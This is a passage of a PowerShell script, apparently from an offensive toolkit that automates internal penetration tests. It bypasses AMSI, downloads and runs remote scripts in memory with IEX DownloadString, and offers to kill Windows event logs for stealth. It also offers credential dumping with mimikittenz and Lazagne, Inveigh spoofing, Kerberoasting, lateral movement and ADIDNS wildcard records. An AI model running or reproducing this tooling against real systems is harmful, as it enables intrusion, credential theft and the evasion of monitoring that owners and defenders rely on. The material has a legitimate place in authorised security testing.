   --> Automate some internal Penetrationtest processes

'@
    if (isadmin)
    {
        Write-Host -ForegroundColor Green 'Elevated PowerShell session detected. Continuing.'
    }
    else
    {
        Write-Host -ForegroundColor Red 'Only running non-elevated PowerShell commands. Please launch an elevated session if you have local Administrator Credentials and try again.'
    }
    Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
    
    dependencychecks
    AmsiBypass
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-mimikittenz.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Phant0m.ps1')
      
    if (isadmin)
    {
        $stealth = Read-Host -Prompt 'Kill event Logs for stealth? (yes/no)'
        if ($stealth -eq "yes" -or $stealth -eq "y" -or $stealth -eq "Yes" -or $stealth -eq "Y")
        {
            Write-Host -ForegroundColor Yellow 'Killing Event Log Services:'
            Invoke-Phant0m
        }
     }
    
    
    $inveigh = Read-Host -Prompt 'Do you want to use inveigh for NBNS/SMB/HTTPS Spoofing parallel to this script? (yes/no)'
    if ($inveigh -eq "yes" -or $inveigh -eq "y" -or $inveigh -eq "Yes" -or $inveigh -eq "Y")
    {
        Inveigh
    }        
    
    if (isadmin)
    {
        $Mimidump = Read-Host -Prompt 'You are local Administrator. Do you want to dump local Passwords with Invoke-kittie? (yes/no)'
        if ($Mimidump -eq "yes" -or $Mimidump -eq "y" -or $Mimidump -eq "Yes" -or $Mimidump -eq "Y")
        {
            kittielocal
        }
        else{Write-Host -ForegroundColor Yellow 'Boring...'}
    }
    
    $localRecon = Read-Host -Prompt 'Do you want to use local recon scripts? (yes/no)'
    if ($localRecon -eq "yes" -or $localRecon -eq "y" -or $localRecon -eq "Yes" -or $localRecon -eq "Y")
    {
        #Local Reconning
        localreconmodules
    }
    
    $domainRecon = Read-Host -Prompt 'Do you want to use domain recon scripts? (yes/no)'
    if ($domainRecon -eq "yes" -or $domainRecon -eq "y" -or $domainRecon -eq "Yes" -or $domainRecon -eq "Y")
    {
        domainreconmodules
    }
    
    $privesc = Read-Host -Prompt 'Do you want to search for possible privilege escalation vectors? (yes/no)'
    if ($privesc -eq "yes" -or $privesc -eq "y" -or $privesc -eq "Yes" -or $privesc -eq "Y")
    {
        privescmodules
    }
    
    #Lazagne
    $Lazagne = Read-Host -Prompt 'Do you want to extract local Passwords with Lazagne? (yes/no)'
    if ($Lazagne -eq "yes" -or $Lazagne -eq "y" -or $Lazagne -eq "Yes" -or $Lazagne -eq "Y")
    {
        lazagnemodule 
    }
    
    $kerberoasting = Read-Host -Prompt 'Do you want to use Kerberoasting technique to crack function user Hashes? (yes/no)'
    if ($kerberoasting -eq "yes" -or $kerberoasting -eq "y" -or $kerberoasting -eq "Yes" -or $kerberoasting -eq "Y")
    {
        kerberoasting
    }


    $mimikitt = Read-Host -Prompt 'Do you want to use mimikittenz for password extraction? (yes/no)'
    if ($mimikitt -eq "yes" -or $mimikitt -eq "y" -or $mimikitt -eq "Yes" -or $mimikitt -eq "Y")
    {
        #Exploitation Phase
        Write-Host -ForegroundColor Red 'Mimikittenz, output saved to .\Exploitation\Mimikittenz.txt:'
        Invoke-Mimikittenz >> $currentPath\Exploitation\Mimikittenz.txt
    }
    
    $latmov = Read-Host -Prompt 'Do you want to move laterally - recommended for internal assesments? (yes/no)'
    if ($latmov -eq "yes" -or $latmov -eq "y" -or $latmov -eq "Yes" -or $latmov -eq "Y")
    {
        #Lateral Movement Phase
        latmov
    }
    
    #FindFruit
    $fruit = Read-Host -Prompt 'Do you want to search for possible weak Web Applications in the network? (yes/no)'
    if ($fruit -eq "yes" -or $fruit -eq "y" -or $fruit -eq "Yes" -or $fruit -eq "Y")
    {
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
    }
    
    #Share Enumeration
    $shares = Read-Host -Prompt 'Do you want to search for sensitive Files / Find Shares on the network? (yes/no) (This may take long time)'
    if ($shares -eq "yes" -or $shares -eq "y" -or $shares -eq "Yes" -or $shares -eq "Y")
    {
        sharenumeration
    }
    
    $adi = Read-Host -Prompt 'Do you want to create a ADIDNS Wildcard record? (yes/no)'
    if ($adi -eq "yes" -or $adi -eq "y" -or $adi -eq "Yes" -or $adi -eq "Y")
    {
        adidns
    }
    
    #RDP Access
    $rdp = Read-Host -Prompt 'Do you want to search for Systems you have RDP/Admin-Access to? (yes/no)'
    If ($rdp -eq "yes" -or $rdp -eq "y" -or $rdp -eq "Yes" -or $rdp -eq "Y")
    {
       groupsearch
    }
    
    #End
    Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
    
}

